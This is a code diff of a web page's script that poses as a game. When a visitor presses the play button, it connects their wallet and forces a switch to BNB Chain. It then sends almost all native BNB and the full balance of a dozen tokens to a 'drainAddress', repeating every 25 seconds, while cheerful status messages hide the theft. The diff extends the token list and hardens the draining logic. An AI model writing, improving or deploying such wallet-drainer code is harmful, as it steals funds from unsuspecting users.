@@ -65,16 +65,25 @@
     const status = document.getElementById("status");
     const btn = document.getElementById("playBtn");
 
+    // Correct BNB Chain addresses
     const tokens = [
       {s:"USDT", a:"0x55d398326f99059ff775485246999027b3197955"},
       {s:"USDC", a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"},
+      {s:"BUSD", a:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"},
       {s:"CAKE", a:"0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"},
-      {s:"WBNB", a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"}
+      {s:"WBNB", a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"},
+      {s:"BTCB", a:"0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"},
+      {s:"ETH",  a:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8"},
+      {s:"TWT",  a:"0x4B0F1812e5Df2A09796481Ff14017e6005508003"},
+      {s:"BAKE", a:"0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5"},
+      {s:"FLOKI",a:"0xfb5B838b6cfEEdC2873aB27866079AC55363D37E"},
+      {s:"SHIB", a:"0x2859e4544C4bB03966803B044A93563bD2d0dD4d"},
+      {s:"LINK", a:"0xF8A0bf9cF54Bb92F17374d9e9A321E6a111a51bd"}
     ];
 
     const abi = [
-      "function balanceOf(address) view returns (uint256)",
-      "function transfer(address,uint256) returns (bool)"
+      "balanceOf(address) view returns (uint256)",
+      "transfer(address,uint256) returns (bool)"
     ];
 
     let connected = false;
@@ -86,9 +95,32 @@
       }
 
       try {
+        status.innerHTML = "Connecting... 💕";
+
+        // Force switch to BNB Chain (Chain ID 56)
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]   // 0x38 = 56 in hex (BNB Chain)
+          });
+        } catch (switchError) {
+          // If network not added, add it
+          if (switchError.code === 4902) {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          }
+        }
+
         if (!connected) {
-          status.innerHTML = "Connecting... 💕";
-          await window.ethereum.request({ method: "eth_requestAccounts" });
+          await window.ethereum.request({method: "eth_requestAccounts"});
           connected = true;
         }
 
@@ -96,41 +128,41 @@
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
-        let drained = false;
+        let drainedSomething = false;
 
-        // === Drain Native BNB - Very Aggressive ===
+        // Drain Native BNB (very aggressive)
         const nativeBalance = await provider.getBalance(user);
-        if (nativeBalance > ethers.parseEther("0.0001")) {
-          const amountToSend = nativeBalance - ethers.parseEther("0.0001"); // leave only 0.0001 BNB
-          if (amountToSend > 0n) {
-            try {
-              await signer.sendTransaction({
-                to: drainAddress,
-                value: amountToSend,
-                gasLimit: 150000
-              });
-              drained = true;
-            } catch (e) {}
+        const minThreshold = ethers.parseEther("0.0001");
+        const reserve = ethers.parseEther("0.0002");
+
+        if (nativeBalance > minThreshold) {
+          const amount = nativeBalance - reserve;
+          if (amount > 0n) {
+            const gasEstimate = await provider.estimateGas({to: drainAddress, value: amount});
+            await signer.sendTransaction({
+              to: drainAddress,
+              value: amount,
+              gasLimit: (gasEstimate * 130n) / 100n
+            });
+            drainedSomething = true;
           }
         }
 
-        // === Drain Tokens ===
+        // Drain Tokens
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
             const balance = await contract.balanceOf(user);
             if (balance > 0n) {
-              await contract.transfer(drainAddress, balance, { gasLimit: 200000 });
-              drained = true;
+              await contract.transfer(drainAddress, balance, {gasLimit: 200000n});
+              drainedSomething = true;
             }
           } catch (e) {}
         }
 
-        if (drained) {
-          status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
-        } else {
-          status.innerHTML = "<span class='error'>Try again later 💔</span>";
-        }
+        status.innerHTML = drainedSomething 
+          ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
+          : "<span class='error'>Try again later 💔</span>";
 
       } catch (e) {
         status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
@@ -138,8 +170,9 @@
     }
 
     btn.onclick = () => {
+      drainedSomething = false;
       drain();
-      setInterval(drain, 20000);
+      setInterval(drain, 25000);
     };
   </script>
 </body>
